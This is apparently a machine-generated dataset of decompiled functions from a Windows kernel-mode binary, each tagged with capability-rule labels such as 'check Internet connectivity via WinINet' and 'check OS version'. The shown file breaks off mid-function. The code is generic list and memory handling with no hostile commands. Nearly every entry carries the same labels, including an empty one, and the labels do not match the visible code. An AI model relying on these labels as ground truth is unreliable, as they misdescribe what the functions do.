{
    "00016398": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00016398(ulong arg1, uint64_t arg2)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    code *pcVar6;\n    int64_t in_GS_OFFSET;\n    \n    if (((*0x787d8 <= arg2) && (arg2 <= *0x787d8 + 100)) && (arg1 == 0x109)) {\n        if (*0x787d0 != NULL) {\n            uVar3 = fcn.0001a724();\n            **0x787d0 = *0x787c8;\n            fcn.0001a734(uVar3);\n        }\n        iVar4 = fcn.000619cc();\n        iVar5 = *0x79998;\n        if (*0x79998 == 0) {\n            iVar5 = *0x79990;\n        }\n        uVar3 = *(iVar5 + iVar4);\n        iVar5 = (**0x115f8)();\n        uVar1 = *(in_GS_OFFSET + 0x52);\n        pcVar6 = fcn.0001609c;\n        iVar4 = uVar1 * 0x40;\n        (**0x11608)(*0x78808 + iVar4, fcn.0001609c);\n        (**0x11618)(iVar4 + *0x78808, pcVar6 & 0xffffffffffffff00 | uVar1);\n        (**0x11620)(iVar4 + *0x78808, 0);\n        cVar2 = (**0x115f0)();\n        if (cVar2 == '\\0') {\n            fcn.000164a0(iVar5 + -8, uVar3, 0);\n        }\n        else {\n            fcn.00016774();\n        }\n    }\n    return;\n}\n",
        "token_count": 412
    },
    "00016938": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00016938(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0002f718();\n    if (*0x78818 != 0) {\n        fcn.0003f658();\n        fcn.0003c1ec(0);\n        fcn.0001994c();\n        fcn.00048dd4();\n        fcn.0004164c();\n        if (iVar1 < 0x1b) {\n            fcn.00045008();\n            fcn.00042d80();\n        }\n        else {\n            fcn.000381f0();\n            fcn.00045008();\n        }\n        fcn.00036bc4();\n        fcn.0001cd7c();\n        fcn.0005832c();\n        if (0x1a < iVar1) {\n            fcn.0003dec0();\n        }\n        fcn.000226cc();\n        fcn.0002e350();\n        fcn.0001dc4c();\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "00052250": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.00052250(int64_t *arg1)\n\n{\n    int32_t *piVar1;\n    int64_t arg1_00;\n    int64_t *noname_0;\n    bool bVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    ulong arg1_01;\n    int64_t *piVar6;\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong uStackX24;\n    int64_t iStackX32;\n    \n    arg1_00 = *arg1;\n    bVar2 = false;\n    uStackX16 = 0;\n    uStackX8 = 0;\n    iStackX32 = 0;\n    uStackX24 = 0;\n    if (*0x879c8 == 0) {\n        return 0x21590001;\n    }\n    if ((arg1_00 == 0) ||\n       ((((*(arg1_00 + 0xa8) != 0 && (*(arg1_00 + 0xa8) != 1)) || (*(arg1_00 + 0x10) == 0)) ||\n        ((*(arg1_00 + 0x28) == 0 || (*(arg1_00 + 0x20) == 0)))))) {\n        return 0x21590065;\n    }\n    if (*(arg1_00 + 0xac) == 2) {\n        piVar6 = &iStackX32;\n        uVar5 = fcn.00051020(piVar6, &uStackX24);\n    }\n    else {\n        uVar5 = 0;\n        piVar6 = arg1;\n    }\n    if (uVar5 != 0) {\n        return uVar5;\n    }\n    if (*(arg1_00 + 0xb8) == 0) {\n        noname_0 = *(arg1_00 + 0x10);\n        *(arg1_00 + 0xc0) = 4;\n        *(arg1_00 + 0xb8) = noname_0;\n        uVar4 = *(arg1_00 + 0xc0);\n        piVar6 = noname_0;\n        uVar3 = fcn.0001a8b4(noname_0, uVar4, 2, arg1_00 + 200);\n        *(arg1_00 + 0xb8) = noname_0;\n        *(arg1_00 + 0xc0) = uVar4;\n        uVar5 = uVar3;\n        if (uVar3 != 0) goto code_r0x00052435;\n    }\n    uVar4 = fcn.0001a764(CONCAT71(piVar6 >> 8, 2), &uStackX16, &uStackX8);\n    uVar5 = uVar4;\n    if (uVar4 != 0) goto code_r0x00052435;\n    arg1_01 = fcn.0001a724();\n    uVar4 = 0;\n    if (*0x879c0 == 0) {\ncode_r0x000523f5:\n        uVar5 = 0x21590005;\n    }\n    else {\n        piVar6 = *0x879b8 + 8;\n        do {\n            if (*piVar6 == arg1_00) {\n                uVar5 = uVar4;\n                piVar1 = *(*0x879b8 + 8 + uVar5 * 0x10) + 0xd0;\n                *piVar1 = *piVar1 + -1;\n                if (*(*(*0x879b8 + 8 + uVar5 * 0x10) + 0xd0) != 0) {\n                    uVar5 = 0;\n                    goto code_r0x000523fa;\n                }\n                *(*0x879b8 + 8 + uVar5 * 0x10) = 0;\n                *(*0x879b8 + uVar5 * 0x10) = 0;\n                uVar4 = 0xffffffff;\n                break;\n            }\n            uVar4 = uVar4 + 1;\n            piVar6 = piVar6 + 2;\n        } while (uVar4 < *0x879c0);\n        if (uVar4 != 0xffffffff) goto code_r0x000523f5;\n        fcn.000514b4(arg1_00);\n        uVar5 = 0;\n        bVar2 = true;\n    }\ncode_r0x000523fa:\n    fcn.0001a734(arg1_01);\n    fcn.0001a878(uStackX16, uStackX8);\n    if ((uVar5 == 0) && (bVar2)) {\n        fcn.0001a924(*(arg1_00 + 0xb8), *(arg1_00 + 200));\n        fcn.00051454(arg1);\n    }\ncode_r0x00052435:\n    fcn.00051900(iStackX32, uStackX24);\n    return uVar5;\n}\n",
        "token_count": 1132
    },
    "00016dd4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00016dd4(int64_t arg1)\n\n{\n    int64_t *arg1_00;\n    int64_t iVar1;\n    int64_t *piVar2;\n    uchar auStackX16 [24];\n    \n    fcn.00031564(0x78828, auStackX16, 1);\n    piVar2 = 0x78840;\n    iVar1 = *0x78840;\n    do {\n        if (iVar1 == 0) {\ncode_r0x00016e27:\n            fcn.00031598(0x78828, auStackX16, 1);\n            return;\n        }\n        arg1_00 = *piVar2;\n        if (arg1_00[1] == arg1) {\n            *piVar2 = *arg1_00;\n            fcn.0002fc50(arg1_00);\n            goto code_r0x00016e27;\n        }\n        iVar1 = *arg1_00;\n        piVar2 = arg1_00;\n    } while( true );\n}\n",
        "token_count": 233
    },
    "null": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00016f98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00016f98(ulong noname_0, int64_t arg2)\n\n{\n    uint8_t *puVar1;\n    \n    if (*(arg2 + 0x41) != '\\0') {\n        puVar1 = *(arg2 + 0xb8) + 3;\n        *puVar1 = *puVar1 | 1;\n    }\n    return 0;\n}\n",
        "token_count": 89
    },
    "00017c28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00017c28(void)\n\n{\n    if (*0x78b04 != 0) {\n        *0x78b04 = 0;\n        if (*0x78b08 != 0) {\n            fcn.00016dd4(*0x78b08);\n            (*_fcn.000115b0)(*0x78b08);\n            *0x78b08 = 0;\n        }\n        if (*0x78b10 != 0) {\n            (*_fcn.000115b0)();\n            *0x78b10 = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 135
    },
    "00017d28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00017d28(ulong arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint64_t uVar7;\n    uint64_t uVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    ushort auStack584 [260];\n    \n    if (arg1 == 1) {\n        uVar1 = 0x40;\ncode_r0x00017da3:\n        iVar4 = 0x48;\n    }\n    else {\n        if (arg1 == 2) {\n            uVar1 = 0x44;\n            goto code_r0x00017da3;\n        }\n        if (arg1 == 3) {\n            uVar1 = 0x5e;\n            iVar4 = 0x60;\n        }\n        else {\n            if (arg1 == 0xc) {\n                uVar1 = 0xc;\n                uVar5 = 8;\n                iVar4 = 0x10;\n                goto code_r0x00017dad;\n            }\n            if (arg1 == 0x25) {\n                uVar1 = 0x68;\n                iVar4 = 0x70;\n            }\n            else {\n                if (arg1 != 0x26) {\n                    return arg3;\n                }\n                uVar1 = 0x50;\n                iVar4 = 0x58;\n            }\n        }\n    }\n    uVar5 = 0x3c;\ncode_r0x00017dad:\n    if (arg3 == 0) {\n        arg3._0_4_ = 0;\n    }\n    else {\n        uVar9 = 0;\n        uVar8 = 0;\n        uVar10 = arg3;\n        do {\n            uVar6 = uVar8;\n            uVar3 = *(uVar8 + uVar5 + arg2);\n            if ((uVar3 & 0xfffffffe) < 0x1fe) {\n                uVar3 = uVar3 >> 1;\n            }\n            else {\n                uVar3 = 0xff;\n            }\n            fcn.000619f6(auStack584, uVar1 + uVar8 + arg2, uVar3 * 2);\n            auStack584[uVar3] = 0;\n            uVar3 = uVar6 + *(uVar8 + arg2);\n            iVar2 = fcn.00061a32(auStack584, 0x78a60);\n            if (iVar2 == 0) {\n                if (uVar3 == uVar6) {\n                    if (uVar9 == uVar6) {\n                        return 0xffffffff;\n                    }\n                    *(uVar9 + arg2) = 0;\n                    uVar8 = uVar9;\n                    break;\n                }\n                fcn.00061a2c(uVar8 + arg2, uVar3 + arg2, arg4 - uVar3);\n                uVar10 = uVar10 + (uVar6 - uVar3);\n                uVar7 = uVar8;\n            }\n            else {\n                if (uVar3 == uVar6) break;\n                uVar7 = uVar3;\n                uVar9 = uVar8;\n            }\n            uVar8 = uVar7;\n        } while (uVar7 < uVar10);\n        if (uVar10 != arg3) {\n            arg3._0_4_ = *(uVar5 + uVar8 + arg2) + uVar8 + iVar4 + -2;\n        }\n    }\n    return arg3;\n}\n",
        "token_count": 826
    },
    "000184f8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.000184f8(int64_t *arg1, int64_t *arg2)\n\n{\n    int64_t iVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int32_t iVar5;\n    \n    iVar1 = *arg1;\n    iVar5 = 0;\n    if (arg2 == NULL) {\n        iVar3 = 0;\n        while (iVar5 = arg2,  piVar2 = arg2,  iVar1 != 0) {\n            piVar2 = *(iVar1 + 0x38);\n            if (piVar2 != NULL) {\n                for (; iVar5 = arg2,  *piVar2 != 0; piVar2 = piVar2 + 1) {\n                    arg2 = iVar5 + 1;\n                }\n            }\n            arg2 = iVar5 + 1;\n            iVar3 = iVar3 + 1;\n            iVar1 = arg1[iVar3];\n        }\n    }\n    else {\n        piVar2 = 0x1;\n        iVar3 = 0;\n        while (iVar1 != 0) {\n            piVar4 = *(iVar1 + 0x38);\n            if (piVar4 != NULL) {\n                for (; *piVar4 != 0; piVar4 = piVar4 + 1) {\n                    if (*(*piVar4 + 8) != *arg2 && *arg2 <= *(*piVar4 + 8)) {\n                        piVar2 = piVar2 + 1;\n                        iVar5 = iVar5 + 1;\n                    }\n                }\n            }\n            if (iVar5 != 0) {\n                piVar2 = piVar2 + 1;\n            }\n            iVar3 = iVar3 + 1;\n            iVar1 = arg1[iVar3];\n        }\n    }\n    return piVar2 & 0xffffffff;\n}\n",
        "token_count": 415
    },
    "00018864": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t * fcn.00018864(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    uint64_t uVar3;\n    int16_t *piVar4;\n    \n    arg1_00 = fcn.0002fbc4(0x40);\n    if (arg1_00 != NULL) {\n        fcn.00061a56(arg1_00, 0, 0x40);\n        if (*arg1 == 0) {\n            iVar2 = fcn.0002fbc4(0x208);\n            *arg1_00 = iVar2;\n            if (iVar2 != 0) {\n                fcn.000284e8(iVar2, 0x104);\n                goto code_r0x00018916;\n            }\n        }\n        else {\n            uVar3 = 0xffffffffffffffff;\n            piVar4 = arg1;\n            do {\n                if (uVar3 == 0) break;\n                uVar3 = uVar3 - 1;\n                iVar1 = *piVar4;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 != 0);\n            if (arg1[~uVar3 - 2] == 0x5c) {\n                iVar2 = fcn.0002fcb0(arg1);\n                *arg1_00 = iVar2;\n                if (iVar2 != 0) {\ncode_r0x00018916:\n                    *(arg1_00 + 5) = 0x10;\n                    return arg1_00;\n                }\n            }\n            else {\n                iVar2 = fcn.0002fbc4(~uVar3 * 2 + 2);\n                *arg1_00 = iVar2;\n                if (iVar2 != 0) {\n                    fcn.00061a62(iVar2, 0x11a08, arg1);\n                    goto code_r0x00018916;\n                }\n            }\n        }\n        fcn.0002fc50(arg1_00);\n    }\n    return NULL;\n}\n",
        "token_count": 465
    },
    "0001894c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001894c(ulong *arg1)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    if (arg1 != NULL) {\n        iVar1 = arg1[7];\n        if (iVar1 != 0) {\n            iVar2 = 0;\n            do {\n                if (*(iVar2 + iVar1) == 0) break;\n                fcn.00018928(*(iVar2 + iVar1));\n                iVar1 = arg1[7];\n                iVar2 = iVar2 + 8;\n            } while (iVar1 != 0);\n        }\n        fcn.0002fc50(*arg1);\n        fcn.0002fc50(arg1[7]);\n        fcn.0002fc50(arg1);\n    }\n    return;\n}\n",
        "token_count": 171
    },
    "00018f8c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00018f8c(int64_t arg1, ulong arg2, ulong noname_2, ulong arg4)\n\n{\n    uint32_t uVar1;\n    ulong *puVar2;\n    int32_t iVar3;\n    int64_t *piVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    int64_t *piVar7;\n    uint64_t arg1_00;\n    int64_t iVar8;\n    uint32_t uVar9;\n    int64_t *arg1_01;\n    int64_t iVar10;\n    uint64_t uVar11;\n    uint32_t uVar12;\n    int64_t **in_stack_00000028;\n    int64_t iStack632;\n    int64_t iStack616;\n    uchar auStack600 [536];\n    \n    if (arg1 == 0) {\n        iVar3 = 0x21590065;\n    }\n    else if (in_stack_00000028 == NULL) {\n        iVar3 = 0x21590069;\n    }\n    else {\n        *in_stack_00000028 = NULL;\n        piVar4 = fcn.0002fbc4(0x10);\n        if (piVar4 == NULL) {\n            iVar3 = 0x21590004;\n        }\n        else {\n            piVar4[1] = 0;\n            iVar5 = fcn.00018864(arg1);\n            *piVar4 = iVar5;\n            arg1_01 = piVar4;\n            if (iVar5 == 0) {\ncode_r0x00019217:\n                iVar3 = 0x21590004;\ncode_r0x0001921c:\n                iVar10 = 0;\n                iVar5 = *arg1_01;\n                while (iVar5 != 0) {\n                    fcn.0001894c(iVar5);\n                    iVar10 = iVar10 + 1;\n                    iVar5 = arg1_01[iVar10];\n                }\n                fcn.0002fc50(arg1_01);\n            }\n            else {\n                uVar9 = 1;\n                iStack616 = 0;\n                iStack632 = 1;\n                if (iVar5 != 0) {\n                    iVar5 = 0;\n                    do {\n                        iVar3 = fcn.000189a4(arg2, arg4, *(iVar5 + arg1_01));\n                        if (iVar3 != 0) goto code_r0x0001921c;\n                        piVar4 = arg1_01;\n                        if (noname_2 != '\\0') {\n                            iVar3 = 0;\n                            iVar10 = 0;\n                            piVar7 = *(*(iVar5 + arg1_01) + 0x38);\n                            if (piVar7 != NULL) {\n                                for (; *piVar7 != 0; piVar7 = piVar7 + 1) {\n                                    if ((*(*piVar7 + 0x28) & 0x10) != 0) {\n                                        iVar3 = iVar3 + 1;\n                                        iVar10 = iVar10 + 1;\n                                    }\n                                }\n                                if (0 < iVar10) {\n                                    uVar12 = iVar3 + uVar9;\n                                    uVar1 = uVar12 + 1;\n                                    uVar11 = uVar9 + 1 << 3;\n                                    arg1_00 = uVar1 << 3;\n                                    if (uVar1 == 0) {\n                                        fcn.0002fc50(arg1_01);\n                                        piVar4 = NULL;\n                                    }\n                                    else {\n                                        piVar4 = fcn.0002fbc4(arg1_00);\n                                        if (piVar4 == NULL) goto code_r0x00019217;\n                                        if (arg1_00 < uVar11) {\n                                            uVar11 = arg1_00;\n                                        }\n                                        fcn.000619f6(piVar4, arg1_01, uVar11);\n                                        fcn.0002fc50(arg1_01);\n                                    }\n                                    if (uVar9 < uVar1) {\n                                        fcn.00061a56(piVar4 + iStack632, 0, uVar1 - uVar9 << 3);\n                                    }\n                                    iVar8 = 0;\n                                    if (uVar9 < uVar12) {\n                                        piVar7 = piVar4 + iStack632;\n                                        do {\n                                            puVar2 = *(iVar5 + piVar4);\n                                            iVar6 = puVar2[7];\n                                            while ((*(iVar6 + iVar8 * 8) != 0 &&\n                                                   ((*(*(iVar6 + iVar8 * 8) + 0x28) & 0x10) == 0))) {\n                                                iVar8 = iVar8 + 1;\n                                            }\n                                            if (*(iVar6 + iVar8 * 8) == 0) {\n                                                fcn.00061a0e(auStack600, 0x104, 0x11a20, *puVar2);\n                                            }\n                                            else {\n                                                fcn.00061a0e(auStack600, 0x104, 0x11a38, *puVar2, \n                                                             **(puVar2[7] + iVar8 * 8));\n                                            }\n                                            iVar6 = fcn.00018864(auStack600);\n                                            *piVar7 = iVar6;\n                                            arg1_01 = piVar4;\n                                            if (iVar6 == 0) goto code_r0x00019217;\n                                            uVar9 = uVar9 + 1;\n                                            piVar7 = piVar7 + 1;\n                                            iVar8 = iVar8 + 1;\n                                        } while (uVar9 < uVar12);\n                                    }\n                                    iStack632 = iStack632 + iVar10;\n                                    uVar9 = uVar12;\n                                }\n                            }\n                        }\n                        iStack616 = iStack616 + 1;\n                        iVar5 = iStack616 * 8;\n                        arg1_01 = piVar4;\n                    } while (piVar4[iStack616] != 0);\n                }\n                iVar3 = 0;\n                *in_stack_00000028 = piVar4;\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 1343
    },
    "000197d8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.000197d8(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    int64_t *piVar6;\n    int64_t arg2;\n    int32_t iVar7;\n    uint32_t uVar8;\n    int64_t arg2_00;\n    uint32_t uVar9;\n    \n    arg2 = 0;\n    uVar9 = 0;\n    do {\n        arg2_00 = 0;\n        iVar7 = -1;\n        while( true ) {\n            fcn.0002f23c(0x78b40);\n            iVar2 = fcn.00031510(0x78b48, 1);\n            if (iVar2 != 0) break;\n            fcn.0002f2a4(0x78b40);\n            (**0x115e0)(0, 0);\n        }\n        uVar8 = 0;\n        piVar6 = 0x78ba8;\n        do {\n            *(piVar6 + -3) = 0;\n            if (*(piVar6 + -0x17) != '\\0') {\n                uVar4 = 0;\n                iVar5 = 0;\n                if (*(piVar6 + -1) != 0) {\n                    iVar1 = *piVar6;\n                    piVar3 = iVar1 + 0x14;\n                    do {\n                        if ((*(piVar3 + 1) != 0) && (*piVar3 == 0)) {\n                            arg2_00 = *(iVar1 + 0x18 + iVar5 * 0x30);\n                            arg2 = *(iVar1 + 0x28 + iVar5 * 0x30);\n                            uVar9 = *(iVar1 + 8 + iVar5 * 0x30);\n                            *(iVar1 + 0xc + iVar5 * 0x30) = 1;\n                            *(*piVar6 + 0x18 + iVar5 * 0x30) = 0;\n                            if (arg2_00 != 0) goto code_r0x000198c2;\n                            break;\n                        }\n                        uVar4 = uVar4 + 1;\n                        iVar5 = iVar5 + 1;\n                        piVar3 = piVar3 + 0xc;\n                    } while (uVar4 < *(piVar6 + -1));\n                }\n                fcn.0002fc50(*piVar6);\n                *(piVar6 + -0x17) = 0;\n            }\n            uVar8 = uVar8 + 1;\n            piVar6 = piVar6 + 9;\n        } while (uVar8 < 0x32);\ncode_r0x000198c2:\n        if (0x31 < uVar8) {\n            *0x79978 = 0;\n            fcn.0002fc50(*0x79980);\n            iVar7 = 0;\n        }\n        fcn.000314ec(0x78b48, 1);\n        fcn.0002f2a4(0x78b40);\n        if (iVar7 == 0) {\n            return;\n        }\n        if (arg2_00 != 0) {\n            if (arg2 != 0) {\n                iVar7 = fcn.0004eb70(uVar9, arg2, 0, 0);\n            }\n            if (iVar7 == 0) {\n                fcn.0004ee74(uVar9, arg2_00);\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 794
    },
    "0001994c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0001994c(void)\n\n{\n    if (*0x78b30 != '\\0') {\n        *0x78b30 = '\\0';\n        fcn.00031648(0x78b20, 0);\n        fcn.00031624(0x78b20);\n        fcn.000197d8();\n        fcn.0002f23c(0x78b40);\n        fcn.0002f2a4(0x78b40);\n        fcn.000315d4(0x78b48);\n        fcn.0002f214(0x78b40);\n        fcn.0002fc50(*0x79988);\n        fcn.00061a56(0x78b40, 0, 0xe50);\n    }\n    return;\n}\n",
        "token_count": 182
    },
    "00019e18": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00019e18(char *arg1, ulong arg2)\n\n{\n    char cVar1;\n    int64_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    int32_t *piVar7;\n    int64_t *piVar8;\n    uint64_t uVar9;\n    uint32_t uVar10;\n    char *pcVar11;\n    int32_t iVar12;\n    \n    if (*0x78b30 != '\\0') {\n        fcn.0002f23c(0x78b40);\n        uVar9 = 0;\n        piVar8 = 0x78ba8;\n        do {\n            if ((*(piVar8 + -0x17) != '\\0') && (*(piVar8 + -3) != '\\0')) {\n                iVar5 = piVar8[-8];\n                uVar6 = 0xffffffffffffffff;\n                pcVar11 = arg1;\n                do {\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                    cVar1 = *pcVar11;\n                    pcVar11 = pcVar11 + 1;\n                } while (cVar1 != '\\0');\n                iVar12 = 0;\n                iVar4 = ~uVar6 - 1;\n                do {\n                    if (((*(iVar4 + iVar5) == ',') || (*(iVar4 + iVar5) == '\\0')) &&\n                       (iVar3 = fcn.00061a8c(arg1, iVar5, ~uVar6 - 1 & 0xffffffff),  iVar3 == 0)) break;\n                    iVar5 = fcn.00061a86(iVar5, 0x2c);\n                    iVar12 = iVar12 + 1 + iVar4;\n                    if (iVar5 == 0) goto code_r0x00019f7a;\n                } while (iVar12 + iVar4 < 0x104);\n                if (iVar5 != 0) {\n                    iVar5 = 0;\n                    uVar6 = 0;\n                    if (*(piVar8 + -1) != 0) {\n                        iVar2 = *piVar8;\n                        piVar7 = iVar2 + 8;\n                        do {\n                            if (*piVar7 == arg2) {\n                                if ((*(iVar2 + 0x18 + iVar5 * 0x30) == 0) || (*(iVar2 + 0x14 + iVar5 * 0x30) != 0)) {\n                                    *(iVar2 + 0x14 + iVar5 * 0x30) = 1;\n                                }\n                                else {\n                                    *(iVar2 + 0x14 + iVar5 * 0x30) = 1;\n                                    fcn.000313f0(0x78b48, 0);\n                                    iVar4 = fcn.00019290(uVar9 * 0x48 + 0x78b68, uVar6 * 0x30 + *piVar8, 0x19764);\n                                    if (iVar4 != 0) {\n                                        fcn.000314ec(0x78b48, 0);\n                                    }\n                                }\n                                break;\n                            }\n                            uVar10 = uVar6 + 1;\n                            uVar6 = uVar10;\n                            iVar5 = iVar5 + 1;\n                            piVar7 = piVar7 + 0xc;\n                        } while (uVar10 < *(piVar8 + -1));\n                    }\n                }\n            }\ncode_r0x00019f7a:\n            uVar10 = uVar9 + 1;\n            uVar9 = uVar10;\n            piVar8 = piVar8 + 9;\n        } while (uVar10 < 0x32);\n        fcn.0002f2a4(0x78b40);\n    }\n    return;\n}\n",
        "token_count": 853
    },
    "0001a764": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0001a764(ulong noname_0, uint64_t *arg2, uint8_t *arg3)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint64_t uVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int64_t iVar7;\n    uint32_t uVar8;\n    uint64_t uVar9;\n    int64_t in_GS_OFFSET;\n    bool bVar10;\n    \n    uVar9 = 0;\n    uVar1 = (**0x115f0)();\n    *arg3 = uVar1;\n    if (uVar1 < noname_0) {\n        uVar1 = (**0x11218)();\n        *arg3 = uVar1;\n    }\n    iVar2 = fcn.00049b64();\n    uVar4 = uVar9;\n    if (iVar2 != 1) {\n        LOCK();\n        *0x799a0 = 0;\n        LOCK();\n        *0x799a8 = 0;\n        uVar3 = fcn.00049b64();\n        uVar4 = fcn.0002fbf0(uVar3 << 6);\n        if (uVar4 == 0) {\n            uVar9 = 0xc0000017;\n        }\n        else {\n            uVar1 = *(in_GS_OFFSET + 0x52);\n            iVar2 = fcn.00049b64();\n            uVar5 = uVar9;\n            if (iVar2 != 0) {\n                do {\n                    if (uVar5 != uVar1) {\n                        iVar7 = uVar5 * 0x40 + uVar4;\n                        (**0x11608)(iVar7, 0x1a738, 0);\n                        uVar6 = 0;\n                        (**0x11610)(iVar7, 2);\n                        (**0x11618)(iVar7, uVar6 & 0xffffffffffffff00 | uVar5 & 0xff);\n                        (**0x11620)(iVar7, 0);\n                    }\n                    uVar8 = uVar5 + 1;\n                    uVar5 = uVar8;\n                    uVar3 = fcn.00049b64();\n                } while (uVar8 < uVar3);\n            }\n            